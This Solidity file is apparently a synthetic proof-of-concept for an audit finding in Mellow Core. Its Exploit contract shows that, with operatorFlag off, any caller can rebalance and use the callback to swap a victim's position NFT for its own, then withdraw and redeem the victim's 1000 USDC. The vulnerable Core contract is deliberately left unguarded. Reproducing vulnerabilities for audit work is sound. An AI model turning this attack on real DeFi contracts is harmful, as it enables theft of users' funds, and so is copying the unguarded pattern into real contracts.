// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Mellow Core — operatorFlag == false lets anyone rebalance, and the callback
    chooses the NFT ids that replace each managed position (Cantina, finding 40578).

    SYNTHETIC, cheatcode-free reduction of Core.rebalance. The quoted gate is
    `if (operatorFlag) _requireAtLeastOperator()`. The victim's position is a
    USDC/WETH NFT backing 1000 USDC. The attacker raises their own NFT's
    liquidity number enough to pass that position's minLiquidity check, then
    returns the two ids swapped. withdraw sends them the victim NFT, which
    redeems 1000 USDC.

    run() does not warp. */

contract USDC {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PositionNFT {
    USDC public usdc;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public liquidityOf;
    mapping(uint256 => uint256) public valueOf;

    constructor(USDC usdc_) {
        usdc = usdc_;
    }

    function mint(address to, uint256 id, uint256 liquidity, uint256 value) external {
        ownerOf[id] = to;
        liquidityOf[id] = liquidity;
        valueOf[id] = value;
        if (value > 0) usdc.mint(address(this), value);
    }

    function setLiquidity(uint256 id, uint256 liquidity) external {
        liquidityOf[id] = liquidity;
    }

    function transferFrom(address from, address to, uint256 id) external {
        require(ownerOf[id] == from, "from");
        ownerOf[id] = to;
    }

    function redeem(uint256 id) external {
        require(ownerOf[id] == msg.sender, "owner");
        uint256 value = valueOf[id];
        valueOf[id] = 0;
        usdc.transfer(msg.sender, value);
    }
}

interface ICallback {
    function onRebalance(uint256[] calldata ids) external returns (uint256[] memory);
}

contract Core {
    PositionNFT public nft;
    bool public operatorFlag;
    uint256 public permissionlessRebalances;
    mapping(address => bool) public isOperator;

    struct Position {
        address owner;
        uint256 tokenId;
        uint256 minLiquidity;
    }

    Position[] public positions;

    constructor(PositionNFT nft_) {
        nft = nft_;
    }

    function add(address owner, uint256 tokenId, uint256 minLiquidity) external {
        positions.push(Position(owner, tokenId, minLiquidity));
    }

    function rebalance(uint256[] calldata ids, address callback) external {
        if (operatorFlag) {
            require(isOperator[msg.sender], "operator");
        }
        // @> VULN: operatorFlag is false, so the operator check above does not run
        permissionlessRebalances += 1;
        for (uint256 i = 0; i < ids.length; i++) {
            uint256 tokenId = positions[ids[i]].tokenId;
            nft.transferFrom(address(this), callback, tokenId);
        }
        uint256[] memory returnedIds = ICallback(callback).onRebalance(ids);
        for (uint256 i = 0; i < ids.length; i++) {
            require(nft.liquidityOf(returnedIds[i]) >= positions[ids[i]].minLiquidity, "min");
            positions[ids[i]].tokenId = returnedIds[i];
            nft.transferFrom(callback, address(this), returnedIds[i]);
        }
    }

    function withdraw(uint256 id, address to) external {
        Position memory info = positions[id];
        require(info.owner == msg.sender, "owner");
        uint256 tokenId = info.tokenId;
        delete positions[id];
        nft.transferFrom(address(this), to, tokenId);
    }

    function tokenOf(uint256 id) external view returns (uint256) {
        return positions[id].tokenId;
    }
}

contract CoreGuarded {
    bool public operatorFlag = true;
    mapping(address => bool) public isOperator;

    function rebalance() external view {
        if (operatorFlag) {
            require(isOperator[msg.sender], "operator");
        }
    }
}

contract Exploit {
    uint256 public constant STOLEN = 1000 ether;
    uint256 public constant VICTIM_ID = 1;
    uint256 public constant ATTACK_ID = 2;

    USDC public usdc;
    PositionNFT public nft;
    Core public core;
    uint256 public redeemed;
    uint256 public victimNow;

    constructor() {
        usdc = new USDC();
        nft = new PositionNFT(usdc);
        core = new Core(nft);
        nft.mint(address(core), VICTIM_ID, 1000, STOLEN);
        nft.mint(address(core), ATTACK_ID, 1, 0);
        core.add(address(0xBEEF), VICTIM_ID, 1000);
        core.add(address(this), ATTACK_ID, 1);
    }

    function onRebalance(uint256[] calldata) external returns (uint256[] memory ids) {
        ids = new uint256[](2);
        ids[0] = ATTACK_ID;
        ids[1] = VICTIM_ID;
    }

    function run() external {
        nft.setLiquidity(ATTACK_ID, 1000);
        uint256[] memory ids = new uint256[](2);
        ids[0] = 0;
        ids[1] = 1;
        core.rebalance(ids, address(this));
        victimNow = core.tokenOf(0);
        core.withdraw(1, address(this));
        nft.redeem(VICTIM_ID);
        redeemed = usdc.balanceOf(address(this));
        require(core.operatorFlag() == false, "flag");
        require(victimNow == ATTACK_ID, "victim position replaced");
        require(nft.ownerOf(VICTIM_ID) == address(this), "attacker holds victim nft");
        require(redeemed == STOLEN, "redeemed");
        require(usdc.balanceOf(address(nft)) == 0, "nft custody empty");
    }
}
